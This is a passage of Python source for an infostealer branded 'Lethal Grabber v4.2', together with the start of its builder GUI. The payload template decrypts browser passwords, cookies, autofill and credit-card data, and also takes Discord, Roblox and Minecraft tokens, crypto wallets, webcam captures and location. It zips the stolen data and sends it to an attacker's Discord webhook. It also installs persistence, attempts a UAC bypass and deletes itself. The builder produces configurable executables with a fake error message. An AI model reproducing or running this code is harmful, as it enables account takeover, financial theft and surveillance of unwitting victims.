                if enc_val and len(enc_val) > 0:
                    decrypted = decrypt_chromium_value(enc_val, master_key, row_dict.get("host_key", ""))
                    if decrypted:
                        try:
                            cookie_value = decrypted.decode('utf-8', errors='ignore')
                        except:
                            cookie_value = decrypted.hex()
            if cookie_value and len(cookie_value) > 0:
                row_dict["decrypted_value"] = cookie_value
                results.append(row_dict)
        conn.close()
        os.remove(tmp)
    except:
        try: os.remove(tmp)
        except: pass
    return results

def get_roblox_cookies_v2():
    roblox_cookies = {}
    for browser_names, base_path in get_chromium_browsers_list():
        if not os.path.isdir(base_path):
            continue
        master_key = get_chromium_master_key(base_path)
        if not master_key:
            continue
        profiles = ["Default"] + [p for p in os.listdir(base_path) if p.startswith("Profile ")]
        for profile in profiles:
            profile_path = os.path.join(base_path, profile)
            if not os.path.isdir(profile_path):
                continue
            cookies_db = os.path.join(profile_path, "Network", "Cookies")
            if not os.path.exists(cookies_db):
                cookies_db = os.path.join(profile_path, "Cookies")
            if not os.path.exists(cookies_db):
                continue
            try:
                tmp = os.path.join(TEMP_DIR, f"rbx_{uuid.uuid4().hex}.db")
                shutil.copy2(cookies_db, tmp)
                conn = sqlite3.connect(tmp)
                conn.text_factory = lambda b: b.decode(errors='ignore')
                cursor = conn.execute("PRAGMA table_info(cookies)")
                columns = [row[1] for row in cursor.fetchall()]
                select_cols = ["host_key", "name", "encrypted_value"]
                has_value_col = "has_value" in columns
                has_plain_col = "value" in columns
                if has_value_col:
                    select_cols.append("has_value")
                if has_plain_col:
                    select_cols.append("value")
                query = "SELECT " + ", ".join(select_cols) + " FROM cookies WHERE name = '.ROBLOSECURITY'"
                for row in conn.execute(query):
                    row_dict = dict(zip(select_cols, row))
                    cookie_value = None
                    if has_value_col and has_plain_col:
                        if row_dict.get("has_value") and row_dict.get("value"):
                            val = row_dict["value"]
                            if isinstance(val, bytes):
                                val = val.decode('utf-8', errors='ignore')
                            if val and len(str(val)) > 50:
                                cookie_value = str(val)
                    if not cookie_value:
                        enc_val = row_dict.get("encrypted_value")
                        if enc_val and len(enc_val) > 0:
                            dec = decrypt_chromium_value(enc_val, master_key, row_dict.get("host_key", ""))
                            if dec:
                                try:
                                    cookie_value = dec.decode('utf-8', errors='ignore')
                                except:
                                    cookie_value = dec.hex()
                    if cookie_value and len(cookie_value) > 50:
                        marker = "_|WARNING:-DO-NOT-SHARE-THIS."
                        idx = cookie_value.find(marker)
                        if idx >= 0:
                            cleaned = cookie_value[idx:]
                            cleaned = ''.join(c for c in cleaned if c.isprintable() or c in '\n\r\t').strip()
                            if len(cleaned) > 50 and cleaned not in roblox_cookies:
                                roblox_cookies[cleaned] = True
                conn.close()
                os.remove(tmp)
            except:
                try: os.remove(tmp)
                except: pass
    return list(roblox_cookies.keys())

def extract_chromium_passwords():
    passwords = []
    scanned = []
    for browser_names, base_path in get_chromium_browsers_list():
        if not os.path.isdir(base_path):
            continue
        master_key = get_chromium_master_key(base_path)
        profiles = ["Default"] + [p for p in os.listdir(base_path) if p.startswith("Profile ")]
        for profile in profiles:
            profile_path = os.path.join(base_path, profile)
            if not os.path.isdir(profile_path):
                continue
            login_db = os.path.join(profile_path, "Login Data")
            if not os.path.exists(login_db):
                continue
            try:
                tmp = os.path.join(TEMP_DIR, f"lg_{uuid.uuid4().hex}.db")
                shutil.copy2(login_db, tmp)
                conn = sqlite3.connect(tmp)
                rows = conn.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()
                conn.close()
                os.remove(tmp)
                for url, user, enc_pass in rows:
                    user_str = user.decode('utf-8', errors='ignore') if isinstance(user, bytes) else (user or "")
                    pwd_str = ""
                    if enc_pass and len(enc_pass) > 0:
                        pwd = decrypt_chromium_value(enc_pass, master_key, url)
                        if pwd:
                            pwd_str = pwd.decode('utf-8', errors='ignore')
                    if pwd_str or user_str:
                        passwords.append(f"URL: {url}\nUsername: {user_str}\nPassword: {pwd_str}\n{chr(61)*50}")
                if browser_names[0] not in scanned:
                    scanned.append(browser_names[0])
            except:
                try: os.remove(tmp)
                except: pass
    return passwords, scanned

def extract_chromium_autofills():
    autofills = []
    for browser_names, base_path in get_chromium_browsers_list():
        if not os.path.isdir(base_path):
            continue
        master_key = get_chromium_master_key(base_path)
        profiles = ["Default"] + [p for p in os.listdir(base_path) if p.startswith("Profile ")]
        for profile in profiles:
            profile_path = os.path.join(base_path, profile)
            if not os.path.isdir(profile_path):
                continue
            web_db = os.path.join(profile_path, "Web Data")
            if not os.path.exists(web_db):
                continue
            try:
                tmp = os.path.join(TEMP_DIR, f"wb_{uuid.uuid4().hex}.db")
                shutil.copy2(web_db, tmp)
                conn = sqlite3.connect(tmp)
                tables = [t[0] for t in conn.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()]
                if "autofill" in tables:
                    for row in conn.execute("SELECT name, value FROM autofill"):
                        autofills.append(f"Field: {row[0]}\nValue: {row[1]}\n{chr(61)*50}")
                if "autofill_profile_emails" in tables:
                    for row in conn.execute("SELECT value FROM autofill_profile_emails"):
                        autofills.append(f"Email: {row[0]}\n{chr(61)*50}")
                if "autofill_profile_phones" in tables:
                    for row in conn.execute("SELECT type, value FROM autofill_profile_phones"):
                        autofills.append(f"Phone (type {row[0]}): {row[1]}\n{chr(61)*50}")
                if "credit_cards" in tables:
                    for row in conn.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"):
                        name = row[0] or ""
                        exp = f"{row[1]}/{row[2]}" if row[1] and row[2] else ""
                        card_enc = row[3]
                        if card_enc:
                            card_dec = decrypt_chromium_value(card_enc, master_key) or b"[encrypted]"
                        else:
                            card_dec = b""
                        autofills.append(f"Credit Card: {name} | {card_dec.decode('utf-8', errors='ignore')} | Exp: {exp}\n{chr(61)*50}")
                conn.close()
                os.remove(tmp)
            except:
                try: os.remove(tmp)
                except: pass
    return autofills

def extract_all_cookies():
    all_cookies = []
    for browser_names, base_path in get_chromium_browsers_list():
        if not os.path.isdir(base_path):
            continue
        master_key = get_chromium_master_key(base_path)
        profiles = ["Default"] + [p for p in os.listdir(base_path) if p.startswith("Profile ")]
        for profile in profiles:
            profile_path = os.path.join(base_path, profile)
            if not os.path.isdir(profile_path):
                continue
            cookies = get_cookies_from_profile(profile_path, master_key)
            for c in cookies:
                all_cookies.append(f"Host: {c['host_key']}\nName: {c['name']}\nPath: {c.get('path', '/')}\nValue: {c['decrypted_value']}\n{chr(61)*50}")
    return all_cookies

def get_minecraft_sessions():
    sessions = []
    mc_path = os.path.join(ROAMING, ".minecraft")
    if os.path.isdir(mc_path):
        la = os.path.join(mc_path, "launcher_accounts.json")
        if os.path.exists(la):
            try:
                with open(la, "r", encoding="utf-8") as f:
                    data = json.load(f)
                for acc in data.get("accounts", []):
                    sessions.append(f'Username: {acc.get("name","")}\nUUID: {acc.get("uuid","")}\nToken: {acc.get("accessToken","")}')
            except: pass
        uc = os.path.join(mc_path, "usercache.json")
        if os.path.exists(uc):
            try:
                with open(uc, "r", encoding="utf-8") as f:
                    for entry in json.load(f):
                        sessions.append(f'Username: {entry.get("name","")}\nUUID: {entry.get("uuid","")}')
            except: pass
    return sessions

def get_windows_product_key():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")
        dp_id = winreg.QueryValueEx(key, "DigitalProductId")[0]
        winreg.CloseKey(key)
        key_offset = 52
        chars = "BCDFGHJKMPQRTVWXY2346789"
        is_win8 = (dp_id[66] >> 3) & 1
        dp_id = list(dp_id)
        if is_win8:
            dp_id[66] = (dp_id[66] & 0xF7) | ((dp_id[66] & 0x07) << 3) | ((dp_id[66] & 0xF8) >> 3)
        key_bytes = dp_id[key_offset:key_offset+15]
        key_str = ""
        for i in range(24, -1, -1):
            cur = 0
            for j in range(14, -1, -1):
                cur *= 256
                cur = key_bytes[j] ^ cur
                key_bytes[j] = cur // 24
                cur %= 24
            key_str = chars[cur] + key_str
        if is_win8:
            last = key_str[1]
            key_str = key_str[0] + key_str[2:21] + last + key_str[21:]
        return "-".join([key_str[i:i+5] for i in range(0, 25, 5)])
    except:
        return "Could not extract Windows product key"

def get_system_info():
    info = {
        "PC": platform.node() or os.getenv("COMPUTERNAME", "Unknown"),
        "User": getpass.getuser(),
        "OS": platform.platform(),
        "Arch": platform.machine(),
        "IP": "Unknown",
        "HWID": uuid.UUID(int=uuid.getnode()).hex[-12:].upper(),
        "CPU": platform.processor() or "Unknown",
        "MAC": ":".join(["{:02x}".format((uuid.getnode() >> elems) & 0xff) for elems in range(5, -1, -1)]),
        "Date": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"),
    }
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=5) as resp:
            info["IP"] = resp.read().decode("utf-8")
    except:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            info["IP"] = s.getsockname()[0]
            s.close()
        except: pass
    return info

def take_screenshot():
    if not FEAT_SCREENSHOT:
        return None
    try:
        if HAS_PIL:
            from PIL import ImageGrab as IG
            img = IG.grab()
            path = os.path.join(TEMP_DIR, f"ss_{uuid.uuid4().hex}.png")
            img.save(path, "PNG")
            return path
    except: pass
    return None

def send(webhook_url, webhook_name, webhook_avatar, sys_info, formatted_tokens,
         passwords, autofills, cookies, scanned, roblox_cookies, minecraft_sessions,
         ff_passwords, geo_data=None, exodus_wallet_zip=None, street_address=None):
    start = time.time()
    try:
        win_key = get_windows_product_key()
        zip_filename = f"{PC_NAME}.zip"
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            if FEAT_SYSTEM:
                zf.writestr("System/system_info.json", json.dumps(sys_info, indent=4))
            if FEAT_WINKEY:
                zf.writestr("System/windows_product_key.txt", win_key)
            if passwords:
                zf.writestr("Passwords/chromium_passwords.txt", "\n".join(passwords))
            if ff_passwords:
                zf.writestr("Passwords/firefox_passwords.txt", "\n".join(ff_passwords))
            all_cookies = extract_all_cookies() if FEAT_COOKIES else cookies
            if all_cookies:
                zf.writestr("Cookies/all_cookies.txt", "\n".join(all_cookies))
            if FEAT_AUTOFILLS and autofills:
                zf.writestr("Autofill/autofill_data.txt", "\n".join(autofills))
            if FEAT_MINECRAFT and minecraft_sessions:
                zf.writestr("Games/Minecraft/minecraft_sessions.txt", "\n".join(minecraft_sessions))
            if FEAT_ROBLOX and roblox_cookies:
                zf.writestr("Games/Roblox/roblox_cookies.txt", "\n\n".join(roblox_cookies))
            if FEAT_TOKENS and formatted_tokens:
                zf.writestr("Messenger/Discord/discord_tokens.txt", "\n\n".join(formatted_tokens))
            if FEAT_GRAB_CRYPTO:
                crypto_info = grab_crypto_wallets()
                if crypto_info:
                    zf.writestr("Crypto/crypto_wallets.txt", "\n\n".join(crypto_info))
            if exodus_wallet_zip and os.path.exists(exodus_wallet_zip):
                with open(exodus_wallet_zip, 'rb') as exf:
                    zf.writestr("Crypto/Exodus/exodus.wallet.zip", exf.read())
            if FEAT_WEBCAM:
                cam_img = capture_webcam_image()
                if cam_img and os.path.exists(cam_img):
                    with open(cam_img, 'rb') as f:
                        zf.writestr("Webcam/webcam_capture.jpg", f.read())
                    try: os.remove(cam_img)
                    except: pass
            if FEAT_GRAB_ADDRESS and street_address:
                zf.writestr("System/street_address.txt", street_address)
        zip_buffer.seek(0)
        zip_data = zip_buffer.read()
        timestamp = datetime.now(timezone.utc).isoformat()
        valid_tokens = [t for t in formatted_tokens if 'Username:' in t]
        invalid_tokens = [t for t in formatted_tokens if 'Username:' not in t]
        has_exodus = exodus_wallet_zip is not None and os.path.exists(exodus_wallet_zip)
        desc_parts = [
            f"PC: {sys_info.get('PC','Unknown')}",
            f"User: {sys_info.get('User','Unknown')}",
            f"OS: {sys_info.get('OS','Unknown')}",
            f"IP: {sys_info.get('IP','Unknown')}",
            f"Valid Tokens: {len(valid_tokens)}",
            f"Invalid/Expired: {len(invalid_tokens)}"
        ]
        if has_exodus:
            desc_parts.append(f"Exodus Wallet: FOUND")
        if geo_data:
            city = geo_data.get('city', '?')
            region = geo_data.get('regionName', '?')
            country = geo_data.get('country', '?')
            lat = geo_data.get('lat', '?')
            lon = geo_data.get('lon', '?')
            isp = geo_data.get('isp', geo_data.get('org', '?'))
            desc_parts.append(f"Location: {city}, {region}, {country}")
            desc_parts.append(f"Coords: {lat}, {lon}")
            desc_parts.append(f"ISP: {isp}")
        if street_address and FEAT_GRAB_ADDRESS:
            desc_parts.append(f"Address: {street_address[:80]}")
        content = None
        if FEAT_PING_EVERYONE:
            content = "@everyone **New Lethal Grabber Hit!**"
        embed = {
            "title": "⚡ **Lethal Grabber** ⚡",
            "color": 0xFF1100,
            "timestamp": timestamp,
            "description": f"```css\n{chr(10).join(desc_parts)}\n```",
            "fields": [],
            "footer": {"text": f"Completed in {time.time()-start:.2f}s"}
        }
        stats = []
        if FEAT_PASSWORDS:
            stats.append(f"Passwords: {len(passwords) + len(ff_passwords)}")
        if FEAT_AUTOFILLS:
            stats.append(f"Autofills: {len(autofills)}")
        if FEAT_COOKIES:
            stats.append(f"Cookies: {len(cookies)}")
        if FEAT_TOKENS:
            stats.append(f"Tokens: {len(formatted_tokens)}")
        embed["fields"].append({"name": "**Extraction Statistics**", "value": f"```yaml\n{chr(10).join(stats)}\n```", "inline": False})
        if has_exodus:
            embed["fields"].append({"name": "**Exodus Wallet**", "value": "```diff\n+ Exodus wallet folder found and extracted\n```", "inline": False})
        if street_address and FEAT_GRAB_ADDRESS:
            embed["fields"].append({
                "name": "**Street Address**",
                "value": f"```yaml\n{street_address}\n```",
                "inline": False
            })
        if valid_tokens:
            first = valid_tokens[0]
            lines = first.split('\n')
            clean_lines = []
            for line in lines:
                line = line.strip()
                if not line or line.startswith('=') or line.startswith('Gift Codes'):
                    continue
                clean_lines.append(line)
            embed["fields"].append({"name": "**Primary Discord Account**", "value": f"```nim\n{chr(10).join(clean_lines)}\n```", "inline": False})
            try:
                for line in clean_lines:
                    if line.startswith('Token:'):
                        token = line.replace('Token:', '').strip()
                        hdrs = {"Authorization": token}
                        r = requests.get("https://discord.com/api/v10/users/@me", headers=hdrs, timeout=5)
                        if r.status_code == 200:
                            u = r.json()
                            uid = u.get('id', '')
                            avatar_hash = u.get('avatar', '')
                            if uid and avatar_hash:
                                avatar_url = f"https://cdn.discordapp.com/avatars/{uid}/{avatar_hash}.png?size=256"
                                embed["thumbnail"] = {"url": avatar_url}
                        break
            except:
                pass
        if FEAT_ROBLOX and roblox_cookies:
            try:
                first_cookie = roblox_cookies[0] if isinstance(roblox_cookies[0], str) else roblox_cookies[0].decode('utf-8', errors='ignore')
                headers = {"Cookie": f".ROBLOSECURITY={first_cookie}", "Accept": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
                rbx_resp = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers, timeout=10)
                if rbx_resp.status_code == 200:
                    rbx_data = rbx_resp.json()
                    rbx_id = rbx_data.get('id', '')
                    rbx_name = rbx_data.get('name', '')
                    rbx_display = rbx_data.get('displayName', '')
                    premium = "Unknown"
                    try:
                        prem_r = requests.get(f"https://premiumfeatures.roblox.com/v1/users/{rbx_id}/validate-membership", headers=headers, timeout=5)
                        if prem_r.status_code == 200:
                            premium = "Yes" if prem_r.json() else "No"
                    except: pass
                    robux = "Unknown"
                    try:
                        eco_r = requests.get(f"https://economy.roblox.com/v1/users/{rbx_id}/currency", headers=headers, timeout=5)
                        if eco_r.status_code == 200:
                            robux = str(eco_r.json().get("robux", "Unknown"))
                    except: pass
                    created = "Unknown"
                    try:
                        extra_r = requests.get(f"https://users.roblox.com/v1/users/{rbx_id}", headers=headers, timeout=5)
                        if extra_r.status_code == 200:
                            created = extra_r.json().get('created', 'Unknown')
                    except: pass
                    rbx_info = [f"Username: {rbx_name}", f"Display Name: {rbx_display}", f"User ID: {rbx_id}", f"Robux: {robux}", f"Premium: {premium}", f"Created: {created}", f"Cookie: Yes ({len(first_cookie)} chars)"]
                    embed["fields"].append({"name": "**Roblox Account**", "value": f"```yaml\n{chr(10).join(rbx_info)}\n```", "inline": False})
                    try:
                        thumb_r = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={rbx_id}&size=150x150&format=Png&isCircular=false", headers=headers, timeout=5)
                        if thumb_r.status_code == 200:
                            thumb_data = thumb_r.json()
                            if thumb_data.get('data') and len(thumb_data['data']) > 0:
                                img_url = thumb_data['data'][0].get('imageUrl', '')
                                if img_url:
                                    embed["image"] = {"url": img_url}
                    except:
                        try:
                            avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={rbx_id}&width=420&height=420&format=png"
                            embed["image"] = {"url": avatar_url}
                        except:
                            pass
            except:
                pass
        items = []
        if street_address and FEAT_GRAB_ADDRESS:
            items.append("+ Street Address")
        if FEAT_PASSWORDS and (passwords or ff_passwords):
            items.append(f"+ Passwords ({len(passwords) + len(ff_passwords)} entries)")
        if FEAT_AUTOFILLS and autofills:
            items.append(f"+ Autofills ({len(autofills)} entries)")
        if FEAT_COOKIES and cookies:
            items.append(f"+ Cookies ({len(cookies)} entries)")
        if FEAT_TOKENS and formatted_tokens:
            items.append(f"+ Discord Tokens ({len(valid_tokens)} valid / {len(invalid_tokens)} expired)")
        if FEAT_WINKEY:
            items.append("+ Windows Product Key")
        if FEAT_ROBLOX and roblox_cookies:
            items.append(f"+ Roblox Cookies ({len(roblox_cookies)} found)")
        if FEAT_MINECRAFT and minecraft_sessions:
            items.append(f"+ Minecraft Sessions ({len(minecraft_sessions)} found)")
        if has_exodus:
            items.append("+ Exodus Wallet Folder")
        if items:
            embed["fields"].append({"name": f"**Collection Complete - {zip_filename}**", "value": f"```diff\n{chr(10).join(items)}\n```", "inline": False})
        if scanned:
            embed["fields"].append({"name": "**Browsers Scanned**", "value": f"```\n{', '.join(scanned)}\n```", "inline": False})
        payload = {
            "username": webhook_name or "Lethal Grabber",
            "avatar_url": webhook_avatar or "",
            "content": content or "",
            "embeds": [embed],
            "attachments": [{"id": "0", "filename": zip_filename, "description": "Collected data"}]
        }
        files = {"payload_json": (None, json.dumps(payload)), "files[0]": (zip_filename, zip_data, "application/zip")}
        try:
            r = requests.post(webhook_url, files=files, timeout=30)
            if r.status_code in (200, 204):
                return True
        except:
            pass
        try:
            r2 = requests.post(webhook_url, json={"username": webhook_name, "avatar_url": webhook_avatar, "content": content or "", "embeds": [embed]}, timeout=30)
            return r2.status_code in (200, 204)
        except:
            return False
    except:
        return False

def setup_persistence():
    if not FEAT_PERSISTENCE:
        return
    try:
        import winreg
        exe = os.path.abspath(sys.argv[0])
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "LethalGrabber", 0, winreg.REG_SZ, exe)
        winreg.CloseKey(k)
    except: pass
    try:
        if not os.path.isdir(STARTUP_DIR):
            os.makedirs(STARTUP_DIR)
        shutil.copy2(sys.argv[0], os.path.join(STARTUP_DIR, "LethalGrabber.exe"))
    except: pass

def self_destruct():
    if not FEAT_SELFDESTRUCT:
        return
    exe = sys.argv[0]
    b = ('@echo off\r\n:loop\r\ndel "' + exe + '"\r\nif exist "' + exe + '" goto loop\r\ndel %0\r\n')
    enc = base64.b64encode(b.encode()).decode()
    try:
        subprocess.run(["powershell", "-Command", "-"], input=(
            f'$d=[Convert]::FromBase64String("{enc}");'
            f'$b=[Text.Encoding]::UTF8.GetString($d)+" &";'
            f'$b | Out-File -FilePath "$env:TEMP\\kill.bat" -Encoding ASCII;'
            f'Start-Process -WindowStyle Hidden -FilePath "$env:TEMP\\kill.bat";'
            f'Start-Sleep -Seconds 0.5;'
            f'Remove-Item -Force "$env:TEMP\\kill.bat"'
        ), capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
    except:
        pass

def main():
__PH_SHOW_ERROR__
    
    block_av_sites()
    kill_browsers()
    time.sleep(1.0)
    if not HAS_REQUESTS:
        return
    setup_persistence()
    geo_data = get_geolocation() if FEAT_SYSTEM else None
    sys_info = get_system_info() if FEAT_SYSTEM else {}
    street_address = None
    try:
        if FEAT_GRAB_ADDRESS:
            street_address = grab_address_via_browser()
    except:
        street_address = None
    formatted_tokens = get_discord_tokens_with_info() if FEAT_TOKENS else []
    passwords, scanned = extract_chromium_passwords() if FEAT_PASSWORDS else ([], [])
    ff_passwords = []
    if FEAT_PASSWORDS:
        for profiles_dir in [os.path.join(ROAMING, "Mozilla", "Firefox", "Profiles"), os.path.join(LOCAL, "Mozilla", "Firefox", "Profiles")]:
            if os.path.isdir(profiles_dir):
                for profile_name in os.listdir(profiles_dir):
                    profile_path = os.path.join(profiles_dir, profile_name)
                    ff_results = decrypt_firefox_passwords(profile_path)
                    ff_passwords.extend(ff_results)
    autofills = extract_chromium_autofills() if FEAT_AUTOFILLS else []
    cookies = extract_all_cookies() if FEAT_COOKIES else []
    roblox = get_roblox_cookies_v2() if FEAT_ROBLOX else []
    minecraft = get_minecraft_sessions() if FEAT_MINECRAFT else []
    exodus_wallet_zip = None
    if FEAT_GRAB_CRYPTO:
        exodus_wallet_zip = grab_exodus_wallet_folder()
    send(WEBHOOK_URL, WEBHOOK_NAME, WEBHOOK_AVATAR, sys_info, formatted_tokens,
         passwords, autofills, cookies, scanned, roblox, minecraft, ff_passwords, geo_data, exodus_wallet_zip, street_address)
    if exodus_wallet_zip and os.path.exists(exodus_wallet_zip):
        try: os.remove(exodus_wallet_zip)
        except: pass
    ss = take_screenshot()
    if ss and os.path.exists(ss):
        try: os.remove(ss)
        except: pass
    self_destruct()

if __name__ == "__main__":
    try:
        if not is_admin():
            uac_bypass_fodhelper()
        main()
    except:
        pass
'''
    
    code = code.replace("__PH_WEBHOOK_URL__", ph_webhook_url)
    code = code.replace("__PH_WEBHOOK_NAME__", ph_webhook_name)
    code = code.replace("__PH_WEBHOOK_AVATAR__", ph_webhook_avatar)
    code = code.replace("__PH_PASSWORDS__", ph_passwords)
    code = code.replace("__PH_AUTOFILLS__", ph_autofills)
    code = code.replace("__PH_COOKIES__", ph_cookies)
    code = code.replace("__PH_TOKENS__", ph_tokens)
    code = code.replace("__PH_ROBLOX__", ph_roblox)
    code = code.replace("__PH_MINECRAFT__", ph_minecraft)
    code = code.replace("__PH_WINKEY__", ph_winkey)
    code = code.replace("__PH_SCREENSHOT__", ph_screenshot)
    code = code.replace("__PH_SYSTEM__", ph_system)
    code = code.replace("__PH_MESSENGER__", ph_messenger)
    code = code.replace("__PH_PERSISTENCE__", ph_persistence)
    code = code.replace("__PH_SELFDESTRUCT__", ph_selfdestruct)
    code = code.replace("__PH_PING_EVERYONE__", ph_ping_everyone)
    code = code.replace("__PH_BLOCK_AV__", ph_block_av)
    code = code.replace("__PH_GRAB_CRYPTO__", ph_grab_crypto)
    code = code.replace("__PH_WEBCAM__", ph_webcam)
    code = code.replace("__PH_GRAB_ADDRESS__", ph_grab_address)
    
    error_title = features.get("error_title", "Error")
    error_content = features.get("error_content", "An error has occurred")
    if features.get("show_error", False):
        code = code.replace("__PH_SHOW_ERROR__", "    show_error_message()")
        code = code.replace("__PH_ERROR_TITLE__", error_title)
        code = code.replace("__PH_ERROR_CONTENT__", error_content)
    else:
        code = code.replace("__PH_SHOW_ERROR__", "    pass")
        code = code.replace("__PH_ERROR_TITLE__", "Error")
        code = code.replace("__PH_ERROR_CONTENT__", "An error has occurred")
    
    return code


class SleekBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title("Lethal Grabber v4.2 - Builder")
        self.root.configure(bg='#0a0a0f')
        self.root.resizable(False, False)
        self.root.geometry("1100x640")
        
        self.BG = '#0a0a0f'
        self.SIDEBAR_BG = '#0f0f1a'
        self.CARD_BG = '#14142a'
        self.CARD_BORDER = '#3a2a6a'
        self.TEXT = '#e0e0f0'
        self.TEXT_DIM = '#7070a0'
        self.TEXT_SEC = '#9090b0'
        self.ACCENT = '#7c3aed'
        self.ACCENT_GLOW = '#a78bfa'
        self.ACCENT_DIM = '#4a1a8a'
        self.ACCENT_DARK = '#2a1a5a'
        self.GREEN = '#22c55e'
        self.RED = '#ef4444'
        self.ENTRY_BG = '#1a1a3a'
        self.ENTRY_BORDER = '#2a2a5a'
        self.BTN_HOVER = '#6d28d9'
        self.LED_STRIP_H = 3
        
        self.current_tab = tk.StringVar(value="features")
        self.webhook_url = tk.StringVar()
        self.webhook_name = tk.StringVar(value="Lethal Grabber")
        self.webhook_avatar = tk.StringVar()
        self.exe_name = tk.StringVar(value="LethalGrabber")
        self.exe_icon_path = tk.StringVar()
        self.show_error = tk.BooleanVar(value=False)
        self.error_title = tk.StringVar(value="Error")
        self.error_content = tk.StringVar(value="An unexpected error has occurred. Please try again.")
        self.hide_console = tk.BooleanVar(value=True)
        self.add_to_startup_opt = tk.BooleanVar(value=True)
        self.anti_vm = tk.BooleanVar(value=False)
        self.anti_debug = tk.BooleanVar(value=False)
        self.block_av_sites = tk.BooleanVar(value=False)
        self.grab_crypto_wallets = tk.BooleanVar(value=False)
        self.capture_webcam = tk.BooleanVar(value=False)
        self.ping_everyone = tk.BooleanVar(value=False)
        self.grab_address = tk.BooleanVar(value=False)   
        self.features = {
            "passwords": tk.BooleanVar(value=True),
            "autofills": tk.BooleanVar(value=True),
            "cookies": tk.BooleanVar(value=True),
            "tokens": tk.BooleanVar(value=True),
            "roblox": tk.BooleanVar(value=True),
            "minecraft": tk.BooleanVar(value=True),
            "winkey": tk.BooleanVar(value=True),
            "screenshot": tk.BooleanVar(value=True),
            "system": tk.BooleanVar(value=True),
            "messenger": tk.BooleanVar(value=True),
            "persistence": tk.BooleanVar(value=True),
            "selfdestruct": tk.BooleanVar(value=True),
        }
        
        self.build_status = tk.StringVar(value="Ready")
        self.is_building = False
        self.led_phase = 0
        
        self._build_ui()
        self._start_led_animation()
    
    def _build_ui(self):
        self.main_frame = tk.Frame(self.root, bg=self.BG)
        self.main_frame.pack(fill='both', expand=True)
        
        self.led_frame = tk.Frame(self.main_frame, bg=self.BG, height=self.LED_STRIP_H)
        self.led_frame.pack(fill='x')
        self.led_frame.pack_propagate(False)
        
        self.led_canvas = tk.Canvas(self.led_frame, height=self.LED_STRIP_H, bg=self.BG, 
                                     highlightthickness=0, bd=0)
        self.led_canvas.pack(fill='x')
        
        header = tk.Frame(self.main_frame, bg='#0d0d18')
        header.pack(fill='x')
        
        tk.Frame(header, bg=self.ACCENT, height=2).pack(fill='x')
        
        header_inner = tk.Frame(header, bg='#0d0d18')
        header_inner.pack(fill='x', padx=20, pady=(6, 6))
        
        logo_frame = tk.Frame(header_inner, bg='#0d0d18')
        logo_frame.pack(side='left')
        
        tk.Label(logo_frame, text="\u26a1", font=('Segoe UI', 14), fg=self.ACCENT_GLOW, 
                bg='#0d0d18').pack(side='left')
        tk.Label(logo_frame, text=" LETHAL GRABBER ", font=('Segoe UI', 12, 'bold'),
                fg='white', bg='#0d0d18').pack(side='left')
        tk.Label(logo_frame, text="v4.2", font=('Segoe UI', 8, 'bold'),
                fg=self.TEXT_DIM, bg='#0d0d18').pack(side='left')
        
        badge_frame = tk.Frame(header_inner, bg='#0d0d18')
        badge_frame.pack(side='right')
        
        status_dot = tk.Frame(badge_frame, bg=self.ACCENT, width=6, height=6, 
                              highlightthickness=0)
        status_dot.pack(side='left', padx=(0, 4))
        status_dot.pack_propagate(False)
        tk.Label(badge_frame, text="BUILDER", font=('Segoe UI', 7, 'bold'),
                fg=self.TEXT_DIM, bg='#0d0d18').pack(side='left')
        
        body = tk.Frame(self.main_frame, bg=self.BG)
        body.pack(fill='both', expand=True, padx=0, pady=0)
        
        self.sidebar = tk.Frame(body, bg=self.SIDEBAR_BG, width=160)
        self.sidebar.pack(side='left', fill='y')
        self.sidebar.pack_propagate(False)
        
        tk.Frame(self.sidebar, bg=self.ACCENT, width=3).pack(side='left', fill='y')
        
        sidebar_inner = tk.Frame(self.sidebar, bg=self.SIDEBAR_BG)
        sidebar_inner.pack(fill='both', expand=True, padx=10, pady=12)
        
        nav_buttons = [
            ("features", "\U0001f3af Features"),
            ("setup", "\u2699\ufe0f Setup"),
            ("compiler", "\U0001f4e6 Compiler"),
        ]
        
        self.nav_btns = {}
        for key, label in nav_buttons:
            btn_frame = tk.Frame(sidebar_inner, bg=self.SIDEBAR_BG)
            btn_frame.pack(fill='x', pady=2)
            
            btn = tk.Button(
                btn_frame, text=label,
                font=('Segoe UI', 10, 'bold'),
                fg=self.TEXT_DIM, bg=self.SIDEBAR_BG,
                activeforeground='white', 
                activebackground='#1a1a35',
                relief='flat', bd=0, anchor='w',
                padx=10, pady=8, cursor='hand2',
                command=lambda k=key: self._switch_tab(k)
            )
            btn.pack(fill='x')
            self.nav_btns[key] = btn
        
        tk.Frame(sidebar_inner, bg='#1a1a2e', height=1).pack(fill='x', pady=(15, 8))
        tk.Label(sidebar_inner, text="Lethal Grabber v4.2", 
                font=('Segoe UI', 7), fg=self.TEXT_DIM, bg=self.SIDEBAR_BG).pack()
        
        self.content_area = tk.Frame(body, bg=self.BG)
        self.content_area.pack(side='left', fill='both', expand=True)
        
        self.tab_frames = {}
        self.tab_frames["features"] = self._build_features_tab()
        self.tab_frames["setup"] = self._build_setup_tab()
        self.tab_frames["compiler"] = self._build_compiler_tab()
        
        self._switch_tab("features")
        
        bottom_bar = tk.Frame(self.main_frame, bg='#0d0d18', height=32)
        bottom_bar.pack(fill='x', side='bottom')
        bottom_bar.pack_propagate(False)
        
        tk.Frame(bottom_bar, bg=self.ACCENT, height=1).pack(fill='x')
